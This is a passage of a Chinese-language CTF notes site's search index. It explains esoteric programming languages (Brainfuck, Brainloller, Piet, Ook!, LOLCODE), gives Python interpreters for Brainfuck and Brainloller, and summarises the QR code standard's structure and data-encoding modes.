#FFFF00 (255, 255, 0) [ \u6df1\u9ec4 #808000 (128, 128, 0) ] \u9752 #00FFFF (0, 255, 255) IP\u987a\u65f6\u948890\u00b0 \u6df1\u9752 #008080 (0, 128, 128) IP\u9006\u65f6\u948890\u00b0 \u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL Marcos Minond Brainloller \u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ])) \u7279\u6b8a\u5173\u952e\u5b57\u8bed\u8a00 \u00b6 LOLcode \u00b6 \u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL LOLCODE Language - Compiler - Online Decoder, Encoder, Translator","title":"Esolang"},{"location":"ctf/esolang/#esolang","text":"An esoteric programming language, or esolang, is a computer programming language designed to experiment with weird ideas, to be hard to program in, or as a joke, rather than for practical use. \u2014\u2014\u2014\u2014 esolang wiki Abstract \u6b64\u5904\u6574\u7406\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7a0b\u8bed\u8a00\u6216\u8005\u6b63\u5e38\u7f16\u7a0b\u8bed\u8a00\u7684\u7279\u6b8a\u4f7f\u7528\u65b9\u6cd5\uff0c\u591a\u89c1\u4e8eMisc\u9898\u4e2d\uff0c\u4f46\u662f\u6b64\u9875\u9762\u4e5f\u4ec5\u662f\u4ecb\u7ecd\u4e00\u4e9b\u5e38\u89c1\u7684 Esolang\u548c\u5df2\u7ecf\u9047\u5230\u8fc7\u7684Esolang\uff0c\u9898\u76ee\u4e2d\u9047\u5230\u8fd8\u662f\u8981\u968f\u673a\u5e94\u53d8\uff0c\u5584\u7528\u641c\u7d22 Esolang, the esoteric programming languages wiki","title":"Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00"},{"location":"ctf/esolang/#_1","text":"\u6781\u5c0f\u8bed\u8a00\u6307\u7684\u662f\u6307\u4ee4\u6570\u5f88\u5c11\u7684\u4e00\u79cd Esolang","title":"\u6781\u5c0f\u8bed\u8a00"},{"location":"ctf/esolang/#brainfuck","text":"\u7279\u5f81\uff1a\u5305\u542b ><+-.,[] \u516b\u4e2a\u6307\u4ee4\uff0c\u5177\u6709\u56fe\u7075\u5b8c\u5907\u6027 \u6307\u4ee4 \u542b\u4e49 > \u6307\u9488\u52a0\u4e00\uff08\u53f3\u79fb\u4e00\u4f4d\uff09 < \u6307\u9488\u51cf\u4e00\uff08\u5de6\u79fb\u4e00\u4f4d\uff09 + \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u52a0\u4e00 - \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u51cf\u4e00 . \u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u5185\u5bb9\uff08ASCII\u7801\uff09 , \u8f93\u5165\u5185\u5bb9\u5230\u6307\u9488\u6307\u5411\u7684\u5355\u5143\uff08ASCII\u7801\uff09 [ \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e3a\u96f6\uff0c\u5411\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 ] \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 ] \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e0d\u4e3a\u96f6\uff0c\u5411\u524d\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 [ \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 \u5176\u5b83 \u76f4\u63a5\u5ffd\u7565 e.g. ++++++++ [>++++++++++++>+++++++++++++<<-] >++++. -. >+++++++. <+. +. BrainFuck \u89e3\u91ca\u5668 import sys def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : code = input ( \"[*] Input brainfuck code > \" ) Brainfuck ( code ) \u53ef\u89c6\u5316\u6267\u884c\uff1a http://fatiherikli.github.io/brainfuck-visualizer/ Brainfuck Language - Online Decoder, Translator, Interpreter (dcode.fr) Marcos Minond \u53e6\u6709\u4f17\u591a\u53d8\u79cd\uff0c\u5982 Ook!\uff0cBrainfuck+3\uff0c*brainfuck \u7b49 \u8981\u6bd4\u8f83\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u6709\u7684 brainfuck \u4ee3\u7801\u4f1a\u5411\u5de6\u8d8a\u754c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8981\u628a\u89e3\u91ca\u5668\u7684\u521d\u59cb\u4f4d\u7f6e\u5f80\u540e\u79fb\u4e00\u4e0b\uff08\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\u9884\u5148\u6269\u5145 cells \uff0c\u7136\u540e\u4ee4\u8d77\u59cb\u7684 cellptr \u5927\u4e8e0\uff09","title":"BrainFuck"},{"location":"ctf/esolang/#ook","text":"\u7279\u5f81\uff1a\u5168\u662f Ook Ook! Programming Language - Esoteric Code Decoder, Encoder, Translator (dcode.fr)","title":"Ook!"},{"location":"ctf/esolang/#_2","text":"\u56fe\u5f62\u5316\u8bed\u8a00\u662f\u7528\u4e00\u4e9b\u50cf\u7d20\u56fe\u6784\u5efa\u6781\u5c0f\u8bed\u8a00\u7684 Esolang\uff0c\u6700\u4e3a\u8457\u540d\u7684\u662f Piet","title":"\u56fe\u5f62\u5316\u8bed\u8a00"},{"location":"ctf/esolang/#piet","text":"\u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670920\u79cd\u989c\u8272\uff1a #FFC0C0 #FFFFC0 #C0FFC0 #C0FFFF #C0C0FF #FFC0FF #FF0000 #FFFF00 #00FF00 #00FFFF #0000FF #FF00FF #C00000 #C0C000 #00C000 #00C0C0 #0000C0 #C000C0 #FFFFFF #000000 \u4ec5\u7531 00\u3001C0\u3001FF \u6784\u6210\uff0c\u4f8b\u5982\uff1a DM's Esoteric Programming Languages - Piet (dangermouse.net) DM's Esoteric Programming Languages - Piet Samples (dangermouse.net) \u53e6\u8fd8\u6709\u4e00\u4e9b\u4e9b\u53d8\u79cd\uff0c\u5982 Piet-Q","title":"Piet"},{"location":"ctf/esolang/#brainloller","text":"\u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670910\u79cd\u989c\u8272\uff0c\u5176\u4e2d8\u79cd\u5bf9\u5e94 BF \u76848\u4e2a\u6307\u4ee4\uff0c2\u79cd\u5bf9\u5e94\u6307\u9488\u65cb\u8f6c\u6307\u4ee4\uff0c\u4e14\u4ec5\u7531 00\u300180\u3001FF \u6784\u6210 \u989c\u8272 hex \u503c rgb \u503c \u542b\u4e49 \u7ea2 #FF0000 (255, 0, 0) > \u6df1\u7ea2 #800000 (128, 0, 0) < \u7eff #00FF00 (0, 255, 0) + \u6df1\u7eff #008000 (0, 128, 0) - \u84dd #0000FF (0, 0, 255) . \u6df1\u84dd #000080 (0, 0, 128) , \u9ec4 #FFFF00 (255, 255, 0) [ \u6df1\u9ec4 #808000 (128, 128, 0) ] \u9752 #00FFFF (0, 255, 255) IP\u987a\u65f6\u948890\u00b0 \u6df1\u9752 #008080 (0, 128, 128) IP\u9006\u65f6\u948890\u00b0 \u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL Marcos Minond Brainloller \u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ]))","title":"Brainloller"},{"location":"ctf/esolang/#_3","text":"","title":"\u7279\u6b8a\u5173\u952e\u5b57\u8bed\u8a00"},{"location":"ctf/esolang/#lolcode","text":"\u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL LOLCODE Language - Compiler - Online Decoder, Encoder, Translator","title":"LOLcode"},{"location":"ctf/qrcode/","text":"\u4e8c\u7ef4\u7801 QRCode \u6807\u51c6\u9605\u8bfb \u00b6 \u6700\u8fd1\u51e0\u6b21\u6bd4\u8d5b\u9047\u5230\u8fc7\u597d\u51e0\u6b21\u4e8c\u7ef4\u7801\u7684\u9898\u76ee\uff0c\u6253\u7b97\u597d\u597d\u6765\u8bfb\u4e00\u8bfb\u6807\u51c6\u6587\u6863 ISO/IEC 18004:2015 \u6587\u6863 6.1 \u524d\u9762\u7684\u5185\u5bb9\u4e0d\u591a\uff0c\u5c31\u4ece\u5b83\u540e\u9762\u5f00\u59cb\u8bb0\u4e86 \u57fa\u7840\u63cf\u8ff0\u53ca\u7ed3\u6784\uff086.1\u30016.3\uff09 \u00b6 \u57fa\u7840\u63cf\u8ff0\uff085.3\u30016.1\uff09 \u00b6 \u5757\u4f4d\u7f6e\uff1a\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9 (0, 0) \u5411\u4e0bx+\uff0c\u5411\u53f3y+ \u7248\u672c\u8868\u793a\uff1aVersion V-E\uff08\u5176\u4e2dV\u662f\u7248\u672c\u53f7\uff0cE\u662f\u7ea0\u9519\u7b49\u7ea7\uff09 \u6570\u636e\u8868\u793a\uff1a\u9ed1\u5757-1 \u767d\u5757-0\uff08\u53ef\u4ee5\u5e26\u80cc\u666f\u5168\u90e8\u53cd\u8272\uff09 \u5927\u5c0f\uff1a\u4ece\u7248\u672c1\u5230\u7248\u672c40\u4f9d\u6b21\u662f 21x21 \uff5e 177x177\uff08\u6bcf\u589e\u52a0\u4e00\u4e2a\u7248\u672c\uff0c\u8fb9\u957f\u589e\u52a04\uff09 \u652f\u6301\u7684\u6700\u591a\u5b57\u7b26\u6570\uff08\u7248\u672c40\uff09 \u6570\u5b57\u6a21\u5f0f\uff1a7089 \u5b57\u6bcd\u6a21\u5f0f\uff1a4296 \u5b57\u8282\u6a21\u5f0f\uff1a2953 \u65e5\u6587\u6a21\u5f0f\uff1a1817 \u7ea0\u9519\u7b49\u7ea7\u5141\u8bb8\u7684\u6062\u590d\u6bd4\u4f8b L\uff1a7% M\uff1a15% Q\uff1a25% H\uff1a30% \u4e8c\u7ef4\u7801\u7ed3\u6784\uff086.3\uff09 \u00b6 \u529f\u80fd\u56fe\u6848\uff08function patterns\uff09 \u7279\u5f81\u7b26\uff08finder pattern\uff097x7\u9ed1\u5708 5x5\u767d\u5708 3x3\u9ed1\u5757 \u5206\u5272\u7ebf\uff08separator\uff09\u5728\u7279\u5f81\u7b26\u5468\u56f4\u7684\u4e00\u5708\u5168\u767d\u533a\u57df \u65f6\u5e8f\u56fe\u6848\uff08timing patterns\uff09\u7b2c7\u884c\u7b2c7\u5217\u7684\u4e24\u6761\u9ed1\u767d\u6761\u7eb9 \u5bf9\u9f50\u56fe\u6848\uff08alignment patterns\uff09\u7248\u672c1\u65e0\uff0c\u7248\u672c2-6 1\u4e2a\uff0c\u7248\u672c7-13 6\u4e2a\u2026\u2026\uff08\u9644\u5f55E\uff09 \u9759\u9ed8\u533a\uff08quiet zone\uff09\u81f3\u5c114\u4e2a\u5355\u4f4d\u5bbd \u7f16\u7801\u533a\u57df\uff08encoding region\uff09 \u683c\u5f0f\u4fe1\u606f\uff08format information\uff09\u5de6\u4e0a\u89d2\u5206\u5272\u7ebf\u5916\u4e00\u5708\uff0c\u5de6\u4e0b\u89d2\u5206\u5272\u7ebf\u53f3\u4fa7\uff0c\u53f3\u4e0a\u89d2\u5206\u5272\u7ebf\u4e0b\u4fa7 \u7248\u672c\u4fe1\u606f\uff08version information\uff09\u7248\u672c7\u540e\u624d\u6709\uff0c\u5728\u5de6\u4e0b\u5206\u5272\u7ebf\u4e0a\u4fa7\uff0c\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7 \u6570\u636e\u53ca\u7ea0\u9519\u7801\u533a\u57df \u6570\u636e\u7f16\u7801\uff087.4\uff09 \u00b6 \u6570\u636e\u5e8f\u5217\uff087.4.1\uff09 \u00b6 \u9ed8\u8ba4\u7684 ECI \u6a21\u5f0f\u4e0b\uff0c\u6bd4\u7279\u6d41\u4ee5\u6a21\u5f0f\u6807\u8bc6\u7b26\u5f00\u59cb\u3002\u5982\u679c\u4e0d\u662f\u9ed8\u8ba4 ECI \u6a21\u5f0f\uff0c\u5219\u9700\u8981\u4ece ECI \u5934\u5f00\u59cb\uff1a \uff084 bits\uff09ECI \u6a21\u5f0f\u6807\u8bc6\u7b26 \uff088/16/24 bits\uff09ECI Designator \u6bd4\u7279\u6d41\u7684\u5269\u4f59\u90e8\u5206\u7531\u4e0b\u9762\u51e0\u90e8\u5206\u7ec4\u6210\uff1a \uff084 bits\uff09\u6a21\u5f0f\u6807\u8bc6\u7b26 \u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u89c1\u4e0b\u7b2c\u4e8c\u4e2a\u8868\uff09 \u6570\u636e\u6bd4\u7279\u6d41 \u6a21\u5f0f \u6807\u8bc6\u7b26 \u8bf4\u660e ECI 0111 \u6570\u5b57\u6a21\u5f0f 0001 \u53ea\u5305\u542b\u6570\u5b570-9\uff0c3\u4e2a\u6570\u5b57 10 bits \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f 0010 45\u4e2a\u5b57\u7b26\uff0c0-9A-Z \u53ca9\u4e2a\u7b26\u53f7 \u7a7a\u683c$%*+-./:\uff0c2\u4e2a\u5b57\u7b26 11 bits \u5b57\u8282\u6a21\u5f0f 0100 \u6bcf\u4e2a\u5b57\u7b26 8 bits \u65e5\u672c\u6c49\u5b57\u6a21\u5f0f 1000 \u7ed3\u6784\u6dfb\u52a0\u6a21\u5f0f 0011 \u7248\u672c \u6570\u5b57\u6a21\u5f0f\u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6 \u5b57\u6bcd\u6a21\u5f0f\u2026\u2026 \u5b57\u8282\u6a21\u5f0f\u2026\u2026 \u65e5\u6587\u6a21\u5f0f\u2026\u2026 1\uff5e9 10 9 8 8 10\uff5e26 12 11 16 10 27\uff5e40 14 13 16 12 ECI \u6a21\u5f0f\uff087.4.2\uff09 \u00b6 ECI \u6a21\u5f0f\u5373\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u6620\u5c04\u6765\u628a\u5b57\u7b26\u8f6c\u6362\u4e3a\u6bd4\u7279\u6d41 \u800c\u4e14\u90fd\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\u6765\u8868\u793a\u6570\u636e\uff08\u5373\u5728 ECI \u5934\u540e\u7684\u6a21\u5f0f\u6807\u8bc6\u7b26\u4e3a\u5b57\u8282\u6a21\u5f0f\u7684 0100\uff09 \u6bcf\u4e2a ECI \u90fd\u6709\u4e00\u4e2a\u516d\u4f4d\u6570\u7f16\u53f7\uff08assignment value\uff09\uff0c\u53ef\u80fd\u5360 1\u30012\u30013 \u4e2a codewords\uff0c\u5177\u4f53\u6807\u8bc6\u65b9\u5f0f\u89c1\u4e0b\u8868\uff08\u53601\u4e2a codewords \u65f6\u5f00\u5934\u4e00\u5b9a\u662f0\uff0c\u53602\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f10\uff0c\u53603\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f110\uff09\u8868\u4e2d xxxxxxxx \u8868\u793a\u7f16\u53f7\u7684\u4e8c\u8fdb\u5236 ECI Assignment Value Codewords values 000000 \uff5e 000127 0xxxxxxx 000000 \uff5e 016383 10xxxxxx xxxxxxxx 000000 \uff5e 999999 110xxxxx xxxxxxxx xxxxxxxx \u800c\u4e14 ECI \u6a21\u5f0f\u4e0b\u4e2d\u9014\u53ef\u4ee5\u66f4\u6362 ECI \u6307\u793a\u5668\uff0c\u4e00\u4e2a 5C\uff0801011100\uff09\u8868\u793a\u6362\u65b0\u7684 ECI\uff0c\u540e\u9762\u8981\u63a56\u4e2a codewords \u53736\u4e2a\u6570\u5b57\uff08\u5341\u516d\u8fdb\u523630\uff5e39\uff09\u8868\u793a\u7f16\u53f7\uff0c\u800c\u4e0d\u662f\u7528\u4e0a\u8868\u4e2d\u7684\u8868\u793a\u65b9\u6cd5\u3002\u800c 5C \u6b63\u5e38\u60c5\u51b5\u4e0b\u8868\u793a \uff0c\u6240\u4ee5\u8868\u793a \u8fd9\u4e2a\u539f\u6570\u636e\u9700\u8981\u7528\u4e24\u4e2a 5C \u4f8b\u5b50 1 \u4f7f\u7528 ISO/IEC 8859-7\uff08ECI 000009\uff09\u6765\u8868\u793a\u5e0c\u814a\u5b57\u6bcd\u0391\u0392\u0393\u0394\u0395\uff08\u8be5 ECI \u4e0b\u8868\u793a\u4e3a\u5341\u516d\u8fdb\u5236 A1 A2 A3 A4 A5\uff09 \u6bd4\u7279\u6d41\uff1a ECI \u6807\u8bc6\u7b26\uff1a 0111 ECI \u7f16\u53f7\uff1a 00001001 \u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0100 \u5b57\u7b26\u6570\u91cf\uff1a 00000101 \uff085\u4e2a\u5b57\u7b26\uff09 \u6570\u636e\uff1a 10100001 10100010 10100011 10100100 10100101 \u6240\u4ee5\u6700\u7ec8\u7684\u6bd4\u7279\u6d41\uff1a 0111 00001001 0100 00000101 10100001 10100010 10100011 10100100 10100101 \u4f8b\u5b50 2\uff0814.3\uff09 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC\\123456 \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 5C 31 32 33 34 35 36 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC<\u540e\u63a5 ECI 123456 \u4e0b\u7684\u6570\u636e\u2026\u2026> \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 31 32 33 34 35 36 \u2026\u2026 \u6570\u5b57\u6a21\u5f0f\uff087.4.3\uff09 \u00b6 \u8f93\u5165\u7684\u6570\u5b57\u5b57\u7b26\u4e32\uff08\u56e0\u4e3a\u5f00\u5934\u53ef\u4ee5\u662f0\uff09\u8981\u88ab\u5206\u62103\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u4f1a\u8f6c\u6362\u4e3a 10 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08999 -> 1111100111 \uff09\u3002\u5269\u4f59\u4e0d\u52303\u4e2a\u7684\u90e8\u5206\uff0c\u5982\u679c\u52692\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 7 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff0899 -> 1100011 \uff09\u5982\u679c\u52691\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 4 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff089 -> 1001 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0001 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u5b57\u7b26\u4e2a\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5e76\u5f00\u5934\u88650\u81f3\u957f\u5ea6\uff0c\u957f\u5ea6\u7531\u7248\u672c\u51b3\u5b9a\uff0c\u89c1\u4e0a 7.4.1 \u90e8\u5206\u7684\u7b2c\u4e8c\u4e2a\u8868\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1a 01234567 \uff08\u4fdd\u7559\u5f00\u59340\uff09 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000001000 \uff088\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u4e3a 10 bits\uff09 \u6570\u636e\uff1a 012 -> 0000001100 345 -> 0101011001 67 -> 1000011 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000001000 0000001100 0101011001 1000011 \u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[ B=M+C+10\\times\\lfloor\\frac{D}{3}\\rfloor+R \\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff08\u7248\u672c1\uff5e9\u4e3a 10\uff0c\u7248\u672c10\uff5e26\u4e3a 12\uff0c\u7248\u672c27\uff5e40\u4e3a 14\uff09\uff0cD\u4e3a\u8f93\u5165\u5b57\u7b26\u4e2a\u6570\uff0cR\u4e3a\u5269\u4f59\u90e8\u5206\uff08\u82e5 D mod 3 = 0 \u5219\u4e3a 0\uff0c\u82e5 D mod 3 = 1 \u5219\u4e3a 4\uff0c\u82e5 D mod 3 = 2 \u5219\u4e3a 7\uff09 \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff087.4.4\uff09 \u00b6 \u6570\u5b57\u5b57\u6bcd\u6a21\u5f0f\uff08Alphanumeric mode\uff09\u4e0b\u652f\u6301\u7684\u7f16\u7801\u5b57\u7b26\u670945\u4e2a\uff0c\u628a\u5b83\u4eec\u4ece0\u7f16\u53f7\u81f344\u3002\u5176\u4e2d 0-9 \u5bf9\u5e94\u6570\u5b57 0-9\uff0c10-35 \u5bf9\u5e94\u5b57\u6bcd A-Z\uff0c36-44 \u5bf9\u5e949\u4e2a\u7b26\u53f7\uff1a \u8f93\u5165\u7684\u5b57\u7b26\u5148\u6309\u7167\u4e0a\u8868\u8f6c\u6362\u4e3a\u6570\u503c\uff0c\u7136\u540e\u5206\u4e3a\u4e24\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u4e00\u7ec4\u5185\u628a \u7b2c\u4e00\u4e2a\u6570\u503c \u00d7 45 + \u7b2c\u4e8c\u4e2a\u6570\u503c\uff0c\u518d\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 11 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 44\u00d745+44=2024 -> 11111101000 \uff09\u3002\u5982\u679c\u5b57\u7b26\u957f\u5ea6\u4e3a\u5947\u6570\uff0c\u5219\u4f1a\u5269\u4f59\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u5c06\u5176\u503c\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 6 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 11 -> 101100 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0010 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1aAC-42 \u6570\u636e\u6d41\u90e8\u5206\uff1a 